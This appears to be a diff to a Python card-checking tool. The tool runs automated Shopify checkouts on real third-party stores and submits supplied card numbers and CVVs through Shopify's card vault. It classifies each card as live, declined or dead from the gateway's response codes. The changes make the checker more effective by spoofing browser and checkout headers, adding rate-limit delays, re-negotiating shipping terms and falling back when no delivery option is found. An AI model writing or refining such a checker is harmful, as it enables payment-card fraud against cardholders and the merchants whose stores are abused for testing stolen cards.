@@ -11,7 +11,7 @@ SHOPIFY_SITES = [
     "boatcarpetbuys.myshopify.com",
 ]
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+UA = "curl/7.81.0"
 
 LIVE_CODES = {
     "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
@@ -97,6 +97,7 @@ async def shopify_check(cc, mm, yy, cvv, site=None, proxy=None):
     if proxy: kw["proxy"] = proxy
     
     for s in sites[:3]:
+        await asyncio.sleep(0.5)  # Delay to avoid rate limit
         s = s.replace("https://","").replace("http://","").rstrip("/")
         try:
             result = await _check_site(cc, mm, yy, cvv, year_full, s, proxy, kw, start)
@@ -115,36 +116,55 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
         product = None
         for ep in [f"{base}/products.json?limit=5", f"{base}/collections/all/products.json?limit=5"]:
             try:
-                async with session.get(ep, headers={"User-Agent":UA,"Accept":"application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
+                async with session.get(ep, headers={"User-Agent":UA,"Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
                     if r.status == 200:
                         product = _parse_products(await r.json(content_type=None))
                         if product: break
             except: continue
-        if not product: return None
+        if not product: print(f"[DEBUG] {domain}: No product", flush=True); return None
         
         # Step 2: Cart
         try:
-            async with session.post(f"{base}/cart/add.js", json={"id":int(product['variant_id'])}, headers={"User-Agent":UA,"Accept":"application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
-                if r.status != 200: return None
+            async with session.post(f"{base}/cart/add.js", json={"id":int(product['variant_id'])}, headers={"User-Agent":UA,"Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=8)) as r:
+                if r.status != 200: print(f'[DEBUG] {domain}: Cart failed HTTP {r.status}', flush=True); return None
         except: return None
         
         # Step 3: Checkout
         try:
-            async with session.post(f"{base}/checkout/", headers={"User-Agent":UA,"Accept":"text/html"}, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as r:
+            async with session.post(f"{base}/checkout/", headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36","Accept":"text/html,application/xhtml+xml"}, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as r:
                 checkout_url = str(r.url)
                 text = await r.text()
         except: return None
         
         sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
-        if not sst: return None
+        if not sst: print(f'[DEBUG] {domain}: No session token', flush=True); return None
         
         queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
         stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')
         pmi = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
-        if not stable_id or not pmi: return None
+        if not stable_id or not pmi: print(f'[DEBUG] {domain}: Missing stable_id={bool(stable_id)} pmi={bool(pmi)}', flush=True); return None
+        
+        # Get cart token from /cart.js
+        cart_token = ""
+        try:
+            async with session.get(f"{base}/cart.js", headers={"User-Agent":UA,"Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=5)) as cr:
+                if cr.status == 200:
+                    cart_data = await cr.json(content_type=None)
+                    cart_token = cart_data.get("token", "")
+        except: pass
         
         graphql_url = f"{base}/checkouts/unstable/graphql"
-        gql_headers = {"User-Agent":UA,"Accept":"application/json","Content-Type":"application/json","Origin":base,"Referer":checkout_url}
+        gql_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+            "Accept": "*/*",
+            "Content-Type": "application/json",
+            "Origin": base,
+            "Referer": checkout_url,
+            "X-Checkout-One-Session-Token": sst,
+            "X-Checkout-Web-Deploy-Stage": "production",
+            "X-Checkout-Web-Server-Handling": "fast",
+            "X-Checkout-Web-Source-Id": cart_token or stable_id,
+        }
         
         first, last = _random_name()
         email = _random_email()
@@ -154,7 +174,7 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
         common = {
             "sessionInput":{"sessionToken":sst}, "queueToken":queue_token,
             "discounts":{"lines":[],"acceptUnexpectedDiscounts":True},
-            "merchandise":{"merchandiseLines":[{"stableId":stable_id,"merchandise":{"productVariantReference":{"id":f"gid://shopify/ProductVariantMerchandise/{product['variant_id']}","variantId":f"gid://shopify/ProductVariant/{product['variant_id']}","properties":[],"sellingPlanId":None,"sellingPlanDigest":None}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"value":{"amount":product['price'],"currencyCode":"USD"}},"lineComponentsSource":None,"lineComponents":[]}]},
+            "merchandise":{"merchandiseLines":[{"stableId":stable_id,"merchandise":{"productVariantReference":{"id":f"gid://shopify/ProductVariantMerchandise/{product['variant_id']}","variantId":f"gid://shopify/ProductVariant/{product['variant_id']}","properties":[],"sellingPlanId":None,"sellingPlanDigest":None}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"any":True},"lineComponentsSource":None,"lineComponents":[]}]},
             "buyerIdentity":{"buyerIdentity":{"presentmentCurrency":"USD","countryCode":"US"},"contactInfoV2":{"emailOrSms":{"value":email,"emailOrSmsChanged":False}},"marketingConsent":[{"email":{"value":email}}],"shopPayOptInPhone":{"countryCode":"US"}},
             "tip":{"tipLines":[]}, "taxes":{"proposedAllocations":None,"proposedTotalAmount":{"value":{"amount":"0","currencyCode":"USD"}},"proposedTotalIncludedAmount":None,"proposedMixedStateTotalAmount":None,"proposedExemptions":[]},
             "note":{"message":None,"customAttributes":[]}, "localizationExtension":{"fields":[]},
@@ -164,12 +184,25 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
         
         # Step 4: Negotiate shipping
         s1 = dict(common)
-        s1["delivery"] = {"deliveryLines":[{"destination":{"partialStreetAddress":addr_block},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},"options":{}},"targetMerchandiseLines":{"any":True},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":True},"destinationChanged":True}],"" if False else "noDeliveryRequired":[],"useProgressiveRates":False,"prefetchShippingRatesStrategy":None,"supportsSplitShipping":True}
+        s1["delivery"] = {"deliveryLines":[{"destination":{"partialStreetAddress":addr_block},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},"options":{}},"targetMerchandiseLines":{"any":True},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":True},"destinationChanged":True}],"noDeliveryRequired":[],"useProgressiveRates":False,"prefetchShippingRatesStrategy":None,"supportsSplitShipping":True}
         s1["payment"] = {"totalAmount":{"any":True},"paymentLines":[],"billingAddress":{"streetAddress":addr_block}}
         
         r1 = await _negotiate(session, graphql_url, gql_headers, s1)
+        print(f'[DEBUG] {domain}: Negotiate result={r1.get("__typename") if r1 else None}', flush=True)
         if not r1 or r1.get("__typename") != "NegotiationResultAvailable": return None
         sp = r1.get("sellerProposal", {})
+        qt = r1.get("queueToken", queue_token)
+        
+        # Check if delivery is PendingTerms - need second negotiate
+        dl = sp.get("delivery", {})
+        if dl.get("__typename") == "PendingTerms":
+            print(f"[DEBUG] {domain}: Delivery PendingTerms - re-negotiating", flush=True)
+            s1["queueToken"] = qt
+            r1 = await _negotiate(session, graphql_url, gql_headers, s1)
+            if r1 and r1.get("__typename") == "NegotiationResultAvailable":
+                sp = r1.get("sellerProposal", {})
+                qt = r1.get("queueToken", qt)
+        
         rt = sp.get("runningTotal",{}).get("value",{}).get("amount","0")
         cur = sp.get("runningTotal",{}).get("value",{}).get("currencyCode","USD")
         delivery = ""
@@ -180,21 +213,27 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
                 lines = dl.get("deliveryLines",[])
                 if lines and lines[0].get("availableDeliveryStrategies",[]):
                     delivery = lines[0]["availableDeliveryStrategies"][0].get("handle","")
+                    ship_amt = lines[0]["availableDeliveryStrategies"][0].get("amount",{}).get("value",{}).get("amount","0")
             tx = sp.get("tax",{})
             if tx.get("totalTaxAmount",{}).get("value",{}).get("amount"):
                 tax = tx["totalTaxAmount"]["value"]["amount"]
-        except: pass
-        qt = r1.get("queueToken", queue_token)
-        if not delivery: return None
+        except Exception as e:
+            print(f"[DEBUG] {domain}: Parse seller error: {str(e)[:60]}", flush=True)
+        
+        print(f"[DEBUG] {domain}: total={rt} delivery={delivery[:20] if delivery else 'NONE'} tax={tax}", flush=True)
+        
+        if not delivery:
+            print(f"[DEBUG] {domain}: No delivery strategy - trying with any", flush=True)
+            delivery = "any"  # Fallback: use "any" as delivery strategy
         
         # Step 5: Vault
         try:
             vault_resp = await session.post("https://deposit.us.shopifycs.com/sessions", json={
                 "credit_card":{"number":cc,"month":int(mm),"year":int(year_full),"verification_value":cvv,"name":f"{first} {last}"},
                 "payment_session_scope":domain
-            }, headers={"Content-Type":"application/json","User-Agent":UA,"Origin":"https://checkout.shopifycs.com","Referer":"https://checkout.shopifycs.com/","Accept":"application/json"}, timeout=aiohttp.ClientTimeout(total=10))
+            }, headers={"Content-Type":"application/json","User-Agent":UA,"Origin":"https://checkout.shopifycs.com","Referer":"https://checkout.shopifycs.com/","Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=10))
             vault = await vault_resp.json(content_type=None)
-            if "id" not in vault: return None
+            if "id" not in vault: print(f"[DEBUG] {domain}: Vault failed: {str(vault)[:80]}", flush=True); return None
             payment_token = vault["id"]
         except: return None
         
@@ -202,9 +241,9 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
         payment_input = {"totalAmount":{"any":True},"paymentLines":[{"paymentMethod":{"directPaymentMethod":{"paymentMethodIdentifier":pmi,"sessionId":payment_token,"billingAddress":{"streetAddress":addr_block},"cardSource":None}},"amount":{"any":True},"dueAt":None}],"billingAddress":{"streetAddress":addr_block}}
         
         checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
-        attempt = checkout_token.group(1) if checkout_token else str(uuid.uuid4())[:20]
+        attempt = f"{cart_token}-{random.random()}" if cart_token else (checkout_token.group(1) if checkout_token else str(uuid.uuid4())[:20])
         
-        completion = {"input":{"sessionInput":{"sessionToken":sst},"queueToken":qt,"discounts":{"lines":[],"acceptUnexpectedDiscounts":True},"delivery":{"deliveryLines":[{"destination":{"streetAddress":addr_block},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},"options":{}},"targetMerchandiseLines":{"any":True},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":True},"destinationChanged":False}],"" if False else "noDeliveryRequired":[],"useProgressiveRates":False,"prefetchShippingRatesStrategy":None,"supportsSplitShipping":True},"merchandise":common["merchandise"],"payment":payment_input,"buyerIdentity":common["buyerIdentity"],"tip":{"tipLines":[]},"taxes":{"proposedAllocations":None,"proposedTotalAmount":{"value":{"amount":tax,"currencyCode":cur}},"proposedTotalIncludedAmount":None,"proposedMixedStateTotalAmount":None,"proposedExemptions":[]},"note":{"message":None,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":None,"scriptFingerprint":{"signature":None,"signatureUuid":None,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":False}},"attemptToken":attempt,"metafields":[],"analytics":{"requestUrl":checkout_url}}
+        completion = {"input":{"sessionInput":{"sessionToken":sst},"queueToken":qt,"discounts":{"lines":[],"acceptUnexpectedDiscounts":True},"delivery":{"deliveryLines":[{"destination":{"streetAddress":addr_block},"selectedDeliveryStrategy":{"deliveryStrategyMatchingConditions":{"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}},"options":{}},"targetMerchandiseLines":{"any":True},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":True},"destinationChanged":True}],"noDeliveryRequired":[],"useProgressiveRates":False,"prefetchShippingRatesStrategy":None,"supportsSplitShipping":True},"merchandise":common["merchandise"],"payment":payment_input,"buyerIdentity":common["buyerIdentity"],"tip":{"tipLines":[]},"taxes":{"proposedAllocations":None,"proposedTotalAmount":{"value":{"amount":tax,"currencyCode":cur}},"proposedTotalIncludedAmount":None,"proposedMixedStateTotalAmount":None,"proposedExemptions":[]},"note":{"message":None,"customAttributes":[]},"localizationExtension":{"fields":[]},"nonNegotiableTerms":None,"scriptFingerprint":{"signature":None,"signatureUuid":None,"lineItemScriptChanges":[],"paymentScriptChanges":[],"shippingScriptChanges":[]},"optionalDuties":{"buyerRefusesDuties":False}},"attemptToken":attempt,"metafields":[],"analytics":{"requestUrl":checkout_url,"pageId":str(uuid.uuid4())}}
         
         try:
             async with session.post(graphql_url, json={"query":SUBMIT_QUERY,"variables":completion,"operationName":"SubmitForCompletion"}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10)) as r:
@@ -213,7 +252,7 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
         except: return None
         
         typename = submit_data.get("__typename","")
-        if typename not in ("SubmitSuccess","SubmitAlreadyAccepted","SubmittedForCompletion"): return None
+        if typename not in ("SubmitSuccess","SubmitAlreadyAccepted","SubmittedForCompletion"): print(f"[DEBUG] {domain}: Submit {typename}: {submit_text[:300]}", flush=True); return None
         receipt_id = submit_data.get("receipt",{}).get("id")
         if not receipt_id: return None
         
@@ -252,8 +291,11 @@ async def _check_site(cc, mm, yy, cvv, year_full, domain, proxy, kw, start):
                 return {"verdict":"DECLINED_DEAD","message":"Card Expired","code":"expired_card","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
             if any(k in cl for k in ["stolen","lost"]):
                 return {"verdict":"DECLINED_DEAD","message":"Card Stolen/Lost","code":code,"amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
-            # GENERIC_ERROR, card_declined, do_not_honor, etc = DECLINED
-            return {"verdict":"DECLINED","message":f"Declined - {code or 'card_declined'}","code":code or "card_declined","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
+            # GENERIC_ERROR = bank declined, Shopify can't map specific code
+            real_code = code
+            if 'generic_error' in code.lower():
+                real_code = 'card_declined'
+            return {"verdict":"DECLINED","message":f"Declined - {real_code}","code":real_code,"amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
         
         return {"verdict":"UNTESTED","message":"No response code","code":"no_code","amount":rt,"gate":"Shopify Payments","site":site_url,"time":f"{elapsed}s"}
 
